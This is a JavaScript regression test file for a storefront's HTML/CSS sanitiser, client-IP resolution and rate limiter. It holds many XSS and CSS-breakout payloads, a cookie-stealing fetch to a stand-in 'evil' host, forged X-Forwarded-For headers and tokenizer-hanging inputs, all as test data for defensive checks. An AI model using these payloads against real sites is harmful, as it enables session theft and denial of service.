/* Regression tests for the two fixes that protect the most surface area:

   · lib/sanitize.ts  — the admin-editable HTML/CSS/tag-id values that are rendered
     with dangerouslySetInnerHTML on the public storefront.
   · lib/ua.ts        — client IP resolution, which every rate limit and the fraud
     auto-blacklist are keyed on.

   Run with: npm run test:unit   (node --test tests/*.test.cjs) */
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { loader } = require('./load-ts.cjs');

const {
  sanitizeHtml, safeCssValue, safeCssFontStack, safeCssInteger,
  safeGoogleTagId, safeAspectRatio,
} = loader()('lib/sanitize.ts');

/* A payload survives sanitising only if one of these markers reaches the output.
   Checking for markers rather than string equality keeps the tests about the
   security property, not about incidental whitespace. */
const EXECUTION_MARKERS = [
  '<script', 'javascript:', 'onerror', 'onload', 'onclick', 'onfocus',
  '<iframe', '<svg', '<img src=x', '<style', '<object', '<embed', '<math',
  '<template', '<form', '<input', '<base', '<meta', '<link', 'vbscript:',
];

function assertInert(html, label) {
  const out = String(sanitizeHtml(html) || '').toLowerCase();
  for (const marker of EXECUTION_MARKERS) {
    assert.ok(!out.includes(marker), `${label}: output still contains ${JSON.stringify(marker)} → ${out}`);
  }
}

/* ------------------------------------------------------- size chart HTML (XSS) */

test('a real size chart table survives sanitising', () => {
  const chart = `
    <table>
      <thead><tr><th>Size</th><th>Chest (in)</th><th>Length</th></tr></thead>
      <tbody>
        <tr><td><strong>M</strong></td><td align="center">38-40</td><td>28</td></tr>
        <tr><td><strong>L</strong></td><td colspan="2">42-44 / 30</td></tr>
      </tbody>
    </table>`;
  const out = sanitizeHtml(chart);
  assert.ok(out.includes('<table'));
  assert.ok(out.includes('<th>Size</th>'));
  assert.ok(out.includes('colspan="2"'));
  assert.ok(out.includes('align="center"'));
  assert.ok(out.includes('<strong>M</strong>'));
});

test('tableClass is merged onto the first table (replaces the old regex hack)', () => {
  const out = sanitizeHtml('<table><tr><td>x</td></tr></table>', { tableClass: 'sizechart-table' });
  assert.match(out, /<table class="sizechart-table">/);
  // only the first table gets it, and an existing class is preserved
  const two = sanitizeHtml('<table class="mine"><tr><td>a</td></tr></table><table><tr><td>b</td></tr></table>', { tableClass: 'sc' });
  assert.match(two, /class="sc mine"/);
  assert.equal((two.match(/class="sc/g) || []).length, 1);
});

test('script tags are removed together with their body', () => {
  assertInert('<table><tr><td>ok</td></tr></table><script>alert(document.cookie)</script>', 'script');
  const out = sanitizeHtml('<p>before</p><script>var x = "<td>";alert(1)</script><p>after</p>');
  assert.ok(out.includes('before'));
  assert.ok(out.includes('after'));
  assert.ok(!out.includes('alert'));
});

test('inline event handlers never reach the output', () => {
  assertInert('<img src=x onerror="alert(1)">', 'img onerror');
  assertInert('<td onclick="steal()">S</td>', 'td onclick');
  assertInert('<a href="#" onmouseover="alert(1)">size</a>', 'a onmouseover');
  // the tag itself is allowed, the handler is simply dropped
  const out = sanitizeHtml('<td onclick="alert(1)">Medium</td>');
  assert.ok(out.includes('<td>Medium</td>'));
});

test('javascript: and data: URLs are rejected in href and src', () => {
  for (const url of [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    ' javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    '//evil.example.com/x',
    'blob:https://evil/x',
  ]) {
    const out = String(sanitizeHtml(`<a href="${url}">size chart</a>`) || '');
    assert.ok(!out.includes('href'), `href survived for ${url} → ${out}`);
    assert.ok(out.includes('size chart'), 'link text should be kept');
  }
});

test('safe URLs are kept, and target=_blank gets rel=noopener', () => {
  assert.ok(sanitizeHtml('<a href="https://sinzooffcial.com/size">x</a>').includes('href="https://sinzooffcial.com/size"'));
  assert.ok(sanitizeHtml('<a href="/pages/size">x</a>').includes('href="/pages/size"'));
  assert.ok(sanitizeHtml('<a href="mailto:hello@sinzo.dev">x</a>').includes('mailto:'));
  const blank = sanitizeHtml('<a href="/x" target="_blank">y</a>');
  assert.ok(blank.includes('rel="noopener noreferrer"'), blank);
  // a hostile rel from the input is discarded, not merged
  const hostile = sanitizeHtml('<a href="/x" target="_blank" rel="opener">y</a>');
  assert.ok(hostile.includes('rel="noopener noreferrer"'));
  assert.ok(!/rel="opener"/.test(hostile));
});

test('svg / math / iframe / object bodies are dropped, not just the opening tag', () => {
  assertInert('<svg><script>alert(1)</script></svg>', 'svg');
  assertInert('<svg><animate onbegin="alert(1)"/></svg>', 'svg animate');
  assertInert('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style>', 'math mXSS');
  assertInert('<iframe src="https://evil.example.com"></iframe>', 'iframe');
  assertInert('<object data="x.swf"></object>', 'object');
  assertInert('<embed src="x">', 'embed');
});

test('comments, CDATA and stray angle brackets cannot smuggle a tag', () => {
  assertInert('<!--><script>alert(1)</script>-->', 'comment breakout');
  assertInert('<![CDATA[<script>alert(1)</script>]]>', 'cdata');
  assertInert('<p>a < b and c > d</p>', 'bare angle brackets');
  // a ">" inside a quoted attribute must not terminate the tag early
  assertInert('<td title="a > b <script>alert(1)</script>">x</td>', 'quoted gt');
  const out = sanitizeHtml('<td title="a > b">x</td>');
  assert.ok(out.includes('<td'), out);
});

test('unknown tags are unwrapped (children kept) rather than passed through', () => {
  const out = sanitizeHtml('<marquee><blink><td>M</td></blink></marquee>');
  assert.ok(!out.includes('marquee'));
  assert.ok(!out.includes('blink'));
  assert.ok(out.includes('M'));
});

test('text content is escaped, so a description cannot open a tag', () => {
  const out = sanitizeHtml('<td>50% &lt;b&gt;bold&lt;/b&gt; &amp; more</td>');
  // No element may be created from text. Note the rebuilder treats the input as literal
  // text, so a pre-escaped entity comes back double-escaped (renders as "&lt;b&gt;"
  // rather than "<b>") — a deliberate fidelity trade for a value that cannot execute.
  assert.ok(!out.includes('<b>'), out);
  assert.ok(!out.includes('<script'), out);
  assert.ok(out.includes('bold'), out);
  assert.ok(out.includes('&amp;lt;b&amp;gt;'), out);
  // an allowed tag carrying a handler keeps its content but loses the handler
  const raw = sanitizeHtml('<td>a <b onmouseover="x()">c</b> d</td>');
  assert.equal(raw, '<td>a <b>c</b> d</td>');
  assert.ok(!raw.includes('onmouseover'));
});

test('oversized input is truncated instead of consuming CPU', () => {
  const huge = '<p>' + 'a'.repeat(500) + '</p>'.repeat(0) + '<td>'.repeat(20000);
  const out = sanitizeHtml(huge.repeat(20), { maxInputLength: 5000 });
  assert.ok(out.length < 60000);
});

test('non-string and empty input return null so callers skip the block', () => {
  for (const v of [null, undefined, '', '   ', 42, {}, []]) {
    assert.equal(sanitizeHtml(v), null, `expected null for ${JSON.stringify(v)}`);
  }
});

/* ---------------------------------------------------- theme values (CSS breakout) */

test('theme colours that would break out of the <style> block are rejected', () => {
  for (const evil of [
    'red}</style><script>alert(1)</script><style>',
    '#fff; background:url(//evil.example.com/beacon)',
    'red;}',
    'url(javascript:alert(1))',
    'url(//evil.example.com/beacon)',   // no colon → passes the charset, must be denied by name
    'url(https://evil.example.com/x.png)',
    'expression(alert(1))',
    '-moz-binding:url(//evil/x.xml)',
    '#fff @import "//evil/x.css"',
    "red'\"`",
    'red\\',
    'red/*x*/',
    '{"--bg":"red"}',
  ]) {
    const got = safeCssValue(evil, 'FALLBACK');
    assert.notEqual(got, evil, `${evil} was passed through unchanged`);
    assert.ok(!/[<>{};'"\\]/.test(got), `${evil} produced ${got}`);
    assert.ok(!got.includes('*/') && !got.includes('/*'), `${evil} produced ${got}`);
  }
});

test('legitimate theme colours are preserved', () => {
  assert.equal(safeCssValue('#b98a5e'), '#b98a5e');
  assert.equal(safeCssValue('#faf9f7'), '#faf9f7');
  assert.equal(safeCssValue('rgb(20, 20, 20)'), 'rgb(20, 20, 20)');
  assert.equal(safeCssValue('rgba(0,0,0,.5)'), 'rgba(0,0,0,.5)');
  assert.equal(safeCssValue('hsl(30 40% 50%)'), 'hsl(30 40% 50%)');
  assert.equal(safeCssValue('papayawhip'), 'papayawhip');
  assert.equal(safeCssValue(''), '');
  assert.equal(safeCssValue(null, '#141414'), '#141414');
});

test('font stacks drop the quotes that would close the style block', () => {
  assert.equal(safeCssFontStack('Didot, Bodoni MT, Georgia, serif'), 'Didot, Bodoni MT, Georgia, serif');
  assert.equal(safeCssFontStack('Georgia, serif'), 'Georgia, serif');
  assert.equal(safeCssFontStack('x";}</style><script>alert(1)</script>', ''), '');
  assert.equal(safeCssFontStack('"Helvetica Neue", sans-serif'), ''); // quotes are not accepted at all
});

test('integer and ratio settings are coerced or dropped', () => {
  assert.equal(safeCssInteger(12), '12');
  assert.equal(safeCssInteger('12'), '12');
  assert.equal(safeCssInteger('12px}</style>', ''), '');
  assert.equal(safeCssInteger(-5), '');
  assert.equal(safeCssInteger(NaN), '');
  assert.equal(safeAspectRatio('3:4'), '3 / 4');
  assert.equal(safeAspectRatio('16/9'), '16 / 9');
  assert.equal(safeAspectRatio('1x1'), '1 / 1');
  assert.equal(safeAspectRatio('3:4;}</style>', '3 / 4'), '3 / 4');
  assert.equal(safeAspectRatio('garbage'), '3 / 4');
});

/* ---------------------------------------------------------- GTM id (JS breakout) */

test('a gtmId that closes the inline script string is rejected', () => {
  for (const evil of [
    "');alert(1);//",
    "GTM-ABC');fetch('//evil/'+document.cookie);//",
    '</script><script>alert(1)</script>',
    "GTM-XXXX'+'",
    "'+alert(1)+'",
  ]) {
    assert.equal(safeGoogleTagId(evil), '', `${evil} was accepted`);
  }
});

test('real Google tag ids are accepted', () => {
  assert.equal(safeGoogleTagId('GTM-AB12CD'), 'GTM-AB12CD');
  assert.equal(safeGoogleTagId('gtm-ab12cd'), 'GTM-AB12CD');
  assert.equal(safeGoogleTagId('G-ABC123XYZ'), 'G-ABC123XYZ');
  assert.equal(safeGoogleTagId('AW-123456789'), 'AW-123456789');
  assert.equal(safeGoogleTagId('UA-123456-1'), 'UA-123456-1');
  assert.equal(safeGoogleTagId(''), '');
  assert.equal(safeGoogleTagId(null), '');
});

/* ------------------------------------------------- client IP (rate-limit integrity) */

const { getClientIp } = loader({})('lib/ua.ts');
const req = (headers) => new Request('https://shop.example.com/api/x', { headers });

test('with one trusted proxy the right-most XFF entry is the client', () => {
  // Traefik appends the real socket peer to whatever the client sent.
  assert.equal(getClientIp(req({ 'x-forwarded-for': '203.0.113.7' })), '203.0.113.7');
  assert.equal(getClientIp(req({ 'x-forwarded-for': '8.8.8.8, 203.0.113.7' })), '203.0.113.7');
  assert.equal(getClientIp(req({ 'x-forwarded-for': '1.1.1.1, 2.2.2.2, 203.0.113.7' })), '203.0.113.7');
});

test('a forged X-Forwarded-For can no longer choose the rate-limit bucket', () => {
  // The old code took split(",")[0] → "8.8.8.8", a fresh bucket on every request.
  const forged = req({ 'x-forwarded-for': '8.8.8.8, 1.1.1.1, 203.0.113.7' });
  assert.equal(getClientIp(forged), '203.0.113.7');
  assert.notEqual(getClientIp(forged), '8.8.8.8');
});

test('TRUSTED_PROXY_HOPS=2 supports a CDN in front of the reverse proxy', () => {
  const load = loader({}, { NODE_ENV: 'test', TRUSTED_PROXY_HOPS: '2' });
  const { getClientIp: twoHop } = load('lib/ua.ts');
  assert.equal(twoHop(req({ 'x-forwarded-for': '203.0.113.7, 172.16.0.5, 10.0.0.1' })), '172.16.0.5');
});

test('Cloudflare is used directly only when explicitly trusted', () => {
  const cfHeader = { 'cf-connecting-ip': '203.0.113.9', 'x-forwarded-for': '203.0.113.9, 172.70.0.1' };
  assert.equal(getClientIp(req(cfHeader)), '172.70.0.1'); // CF not trusted → the proxy hop wins
  const trusted = loader({}, { NODE_ENV: 'test', TRUST_CLOUDFLARE: '1' })('lib/ua.ts');
  assert.equal(trusted.getClientIp(req(cfHeader)), '203.0.113.9');
});

test('junk in the header degrades to a non-blockable placeholder', () => {
  assert.equal(getClientIp(req({ 'x-forwarded-for': 'not-an-ip' })), '0.0.0.0');
  assert.equal(getClientIp(req({ 'x-forwarded-for': '<script>alert(1)</script>' })), '0.0.0.0');
  assert.equal(getClientIp(req({})), '0.0.0.0');
  assert.equal(getClientIp(req({ 'x-real-ip': '203.0.113.4' })), '203.0.113.4');
  assert.equal(getClientIp(req({ 'x-real-ip': 'javascript:alert(1)' })), '0.0.0.0');
});

test('IPv6, IPv4-mapped and zone-id forms normalise', () => {
  assert.equal(getClientIp(req({ 'x-forwarded-for': '2001:db8::1' })), '2001:db8::1');
  assert.equal(getClientIp(req({ 'x-forwarded-for': '::ffff:203.0.113.7' })), '203.0.113.7');
  assert.equal(getClientIp(req({ 'x-forwarded-for': '[2001:db8::1]' })), '2001:db8::1');
  assert.equal(getClientIp(req({ 'x-forwarded-for': 'fe80::1%eth0' })), 'fe80::1');
  // an out-of-range octet is not an IP
  assert.equal(getClientIp(req({ 'x-forwarded-for': '999.1.1.1' })), '0.0.0.0');
});

test('the resolved IP is length-bounded so it cannot be an unbounded map key', () => {
  const long = '1.1.1.1,'.repeat(5000) + '203.0.113.7';
  assert.ok(getClientIp(req({ 'x-forwarded-for': long })).length <= 45);
});

/* ------------------------------------------- rate limiter: bounded + failure-aware */

/* lib/auth.ts imports ./db, which instantiates a PrismaClient at module load and needs a
   DATABASE_URL. Mock it — none of these assertions touch the database. */
const authLoader = () => loader({ './db': { db: {} } }, {
  NODE_ENV: 'test', SESSION_SECRET: 'unit-test-only-session-secret',
});

test('rateLimit stops at the cap and the window slides', () => {
  const { rateLimit } = authLoader()('lib/auth.ts');
  for (let i = 0; i < 5; i++) assert.equal(rateLimit('t:cap', 5, 1000), true);
  assert.equal(rateLimit('t:cap', 5, 1000), false);
});

test('peek does not consume, hit does — successful logins never lock the account', () => {
  const { rateLimitPeek, rateLimitHit } = authLoader()('lib/auth.ts');
  // eight *successful* logins: peek is never paired with hit, so no lock
  for (let i = 0; i < 20; i++) assert.equal(rateLimitPeek('t:success', 8, 15 * 60 * 1000), true);
  // eight failures do lock
  for (let i = 0; i < 8; i++) {
    assert.equal(rateLimitPeek('t:fail', 8, 15 * 60 * 1000), true);
    rateLimitHit('t:fail', 15 * 60 * 1000);
  }
  assert.equal(rateLimitPeek('t:fail', 8, 15 * 60 * 1000), false);
});

test('rateLimitReset clears an account lock after a correct password', () => {
  const { rateLimitPeek, rateLimitHit, rateLimitReset } = authLoader()('lib/auth.ts');
  for (let i = 0; i < 8; i++) rateLimitHit('t:reset', 15 * 60 * 1000);
  assert.equal(rateLimitPeek('t:reset', 8, 15 * 60 * 1000), false);
  rateLimitReset('t:reset');
  assert.equal(rateLimitPeek('t:reset', 8, 15 * 60 * 1000), true);
});

test('the bucket map cannot be grown without bound by unique attacker keys', () => {
  const load = authLoader();
  const { rateLimit } = load('lib/auth.ts');
  // Inside a loaded module `global`/`globalThis` IS load.runtime — not the host global.
  const buckets = load.runtime.__rl;
  assert.ok(buckets instanceof Map, 'rate limiter should keep its buckets on the module global');
  const before = buckets.size;
  // 60k distinct keys — an attacker rotating a forged XFF used to allocate one entry
  // each, forever, until the 896M container limit OOM-killed the app.
  for (let i = 0; i < 60_000; i++) rateLimit('flood:' + i + ':' + 'x'.repeat(300), 3, 60_000);
  assert.ok(buckets.size <= 20_000, `map grew to ${buckets.size} entries (cap is 20000)`);
  assert.ok(buckets.size >= before);
});

test('over-long rate-limit keys are clamped, not stored verbatim', () => {
  const load = authLoader();
  const { rateLimit } = load('lib/auth.ts');
  rateLimit('k:' + 'a'.repeat(5000), 2, 60_000);
  let longest = 0;
  for (const k of load.runtime.__rl.keys()) longest = Math.max(longest, k.length);
  assert.ok(longest <= 190, `a ${longest}-char key was stored`);
});

/* ---------------------------------------------------------------------------
   Tokenizer termination.

   A parser that can be made to spin forever is a denial-of-service vector in its
   own right, whatever it would eventually emit — and this one is reachable from a
   single admin text field: Category.sizeChart is sanitised while rendering a
   PUBLIC product page, so one malformed value hangs that request forever and pins
   a Node thread at 100% CPU (observed: the whole container became unresponsive,
   load average 6+, every other request starved).

   The stall was a "/" inside a tag that was not part of "/>":
     · the attribute-name scan excludes "/", so it made zero progress
     · readAttrValue() also stopped at "/", returning next === i
   Either one left the loop pointing at the same character forever. This is exactly
   the shape of the well-known slash-separated payloads (<img/src=x/onerror=…>,
   <svg/onload=…>), so the inputs that most needed sanitising were the ones that
   hung. Both loops now guarantee forward progress.
   --------------------------------------------------------------------------- */

/* Assert the real security property structurally rather than by substring: a payload
   may legitimately survive as inert TEXT inside a quoted, escaped attribute value
   (src="x/onerror=…" is a broken image URL, not a handler), so scanning the output for
   "onerror" would be a false positive. What must never happen is an on* ATTRIBUTE.

   Quoted values are consumed as single units — the first version of this helper regexed
   for `name=` across the whole tag body and so reported `onerror` as an attribute when it
   was only text inside src="…", failing on the very payloads it was written to clear. */
function attributeNames(html) {
  const names = [];
  const tagRe = /<([a-zA-Z][a-zA-Z0-9-]*)((?:[^>"']|"[^"]*"|'[^']*')*)>/g;
  for (const tag of String(html || '').matchAll(tagRe)) {
    const body = tag[2];
    let i = 0;
    while (i < body.length) {
      while (i < body.length && /[\s/]/.test(body[i])) i++;      // separators / stray solidi
      const s = i;
      while (i < body.length && !/[\s=/>"']/.test(body[i])) i++;  // attribute name
      const name = body.slice(s, i).toLowerCase();
      while (i < body.length && /\s/.test(body[i])) i++;
      if (body[i] === "=") {
        i++;
        while (i < body.length && /\s/.test(body[i])) i++;
        if (body[i] === '"' || body[i] === "'") {
          const q = body[i];
          const end = body.indexOf(q, i + 1);
          i = end === -1 ? body.length : end + 1;                 // swallow the whole value
        } else {
          while (i < body.length && !/[\s>"']/.test(body[i])) i++;
        }
      }
      if (name) names.push(name);
      if (i === s) i++;                                           // progress guarantee
    }
  }
  return names;
}

const SLASH_VECTORS = [
  '<img/src=x/onerror=alert(document.domain)>',
  '<svg/onload=alert(1)>',
  '<details/open/ontoggle=alert(5)>x</details>',
  '<body/onload=alert(1)>',
  '<input/autofocus/onfocus=alert(1)>',
  '<scr<script>ipt>alert(4)</scr</script>ipt>',
  '<meta http-equiv=refresh content=0;url=https://evil.example>',
  '<a/ href=/x/ onclick=/y>',
  '<div/=//=//=',
  '</scr</script>ipt>',
];

test('slash-separated payloads terminate and emit no event-handler attribute', () => {
  for (const payload of SLASH_VECTORS) {
    const t0 = Date.now();
    const out = sanitizeHtml(payload);
    const ms = Date.now() - t0;
    /* Generous bound: every one of these finishes in ~1ms. A regression here does not
       merely fail an assertion, it hangs the whole suite, which is also a clear signal. */
    assert.ok(ms < 2000, `${payload}: sanitizeHtml took ${ms}ms — tokenizer is spinning`);
    const handlers = attributeNames(out).filter((n) => n.startsWith('on'));
    assert.deepEqual(handlers, [], `${payload}: emitted event handler(s) ${handlers} → ${out}`);
    for (const banned of ['<script', '<iframe', '<style', '<form', '<svg', '<meta', '<details', '<input', '<body']) {
      assert.ok(!String(out || '').toLowerCase().includes(banned),
        `${payload}: output still contains ${banned} → ${out}`);
    }
  }
});

test('degenerate input cannot make the tokenizer spin', () => {
  const degenerate = [
    '<' + '/'.repeat(5000) + '>',                       // thousands of stray solidi
    '<img ' + 'a/'.repeat(2000) + '>',                  // repeated name/solidus pairs
    '<p ' + 'a'.repeat(20000) + '>',                    // one enormous attribute name
    '<a href=' + 'x'.repeat(20000) + '>',               // enormous unquoted value
    '<'.repeat(5000),                                   // never-closing angle brackets
    '<a '.repeat(2000) + '>',
    '<img src=' + '"'.repeat(1000),                     // unbalanced quotes
    '<td title="a"><script>alert(1)</script>">cell</td>',
    Array(500).fill('<img/src=x/onerror=alert(1)>').join(''),
  ];
  for (const payload of degenerate) {
    const t0 = Date.now();
    const out = sanitizeHtml(payload);
    const ms = Date.now() - t0;
    assert.ok(ms < 3000, `degenerate input (${payload.length} chars) took ${ms}ms — spinning`);
    const handlers = attributeNames(out).filter((n) => n.startsWith('on'));
    assert.deepEqual(handlers, [], `degenerate input emitted ${handlers}`);
  }
});

test('a quote inside an attribute value is escaped, so it cannot break out', () => {
  /* The whole allow-list is worthless if a value can close its own attribute. */
  const out = String(sanitizeHtml('<img src=\'x" onerror="alert(1)\'>') || '');
  assert.ok(out.includes('&quot;'), `quote was not escaped → ${out}`);
  assert.ok(!/"\s*onerror\s*=/.test(out), `escaped quote still closed the attribute → ${out}`);
  assert.deepEqual(attributeNames(out).filter((n) => n.startsWith('on')), [],
    `an on* attribute survived → ${out}`);
});

test('a legitimate size chart still round-trips (the fix must not break the feature)', () => {
  const chart = '<table class="sizechart-table"><thead><tr><th scope="col">Size</th>'
    + '<th scope="col">Chest</th></tr></thead><tbody>'
    + '<tr><td>M</td><td>40"</td></tr><tr><td>L</td><td>42"</td></tr>'
    + '</tbody></table>';
  const out = String(sanitizeHtml(chart));
  assert.ok(out.includes('<table'), 'table dropped');
  assert.ok(out.includes('<th'), 'th dropped');
  assert.ok((out.match(/<tr>/g) || []).length === 3, `expected 3 rows, got → ${out}`);
  assert.ok(out.includes('40&quot;') || out.includes('40"'), 'measurement lost');
  assert.ok(out.includes('scope="col"'), 'scope attr lost');
});
